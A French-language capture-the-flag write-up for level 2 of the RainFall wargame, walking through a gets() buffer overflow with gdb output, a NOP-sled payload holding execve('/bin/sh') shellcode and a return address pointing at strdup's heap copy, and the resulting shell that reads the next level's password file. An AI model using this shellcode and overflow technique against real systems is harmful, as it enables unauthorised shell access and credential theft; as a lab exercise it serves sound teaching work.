# **Level 2**

Pour le `level2` c'est la meme idee sauf qu'il n'y a rien dans le code pour lancer un shell, donc on va devoir le lancer par nous meme

```
void p(void)

{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}



void main(void)

{
  p();
  return;
}
```

Le but de cet exercice est d'utiliser la heap (pas la stack car elle n'est pas executable ici) pour executer du code que nous allons lui passer en input

Pour ca on utilise comme point d'entree `gets` pour ecrire notre payload et `strdup` pour l'executer

Comme le buffer est assez grand, on peux ecrire notre `shellcode` dedans, donc on cherche un shellcode pour executer execve("/bin/sh")
[ShellStorm](https://shell-storm.org/shellcode/index.html)
[exploit-db](https://www.exploit-db.com/shellcodes)

On comble le debut de notre payload par des `nop (\x90)` instruction qui permet de passer a la suivante

Et on fini par overwrite `eip` pour faire pointer l'instruction suivant sur le pointeur que r'envoie `strdup`

> On aura quelque chose de la forme `\x90 * (len(to eip) - len(shellcode)) + shellcode + address de debut`

Pour trouver l'addresse de strdup on utilise gdb

```
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
(gdb) b *0x0804853e
Breakpoint 1 at 0x804853e
(gdb) run
Starting program: /home/user/level2/level2 
aaaa
aaaa

Breakpoint 1, 0x0804853e in p ()
(gdb) r i
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) i r
eax            0x804a008	134520840
ecx            0x0	0
edx            0xbffff6cc	-1073744180
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff71c	0xbffff71c
ebp            0xbffff728	0xbffff728
esi            0x0	0
edi            0x0	0
eip            0x804853e	0x804853e <p+106>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/s 0x804a008
0x804a008:	 "aaaa"
```
On peux donc construire notre payload

```
level2@RainFall:/var/crash$ python -c "print '\x90'*35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" > /var/crash/lvl2
```

Et on l'execute

```
level2@RainFall:~$ cat /var/crash/lvl2 -| ./level2 
������������������������������������^�1��F�F
                                            �
                                             ���V
                                                 1�����/bin/s�
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```

> ### NEXT : [Level 3](/level3/resources/README.md)
